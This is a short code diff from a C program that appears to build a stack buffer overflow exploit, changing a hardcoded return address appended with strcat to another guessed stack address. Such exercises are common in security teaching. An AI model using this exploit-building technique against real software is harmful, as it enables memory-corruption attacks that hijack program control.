@@ -43,7 +43,7 @@ int main(void)
     // - 154
   	// strcat(str, "\x6c\xfb\xff\xbf");
 
-  	strcat(str, "\x00\xfc\xff\xbf");
+  	strcat(str, "\xf0\xfb\xff\xbf");
 
 
   }
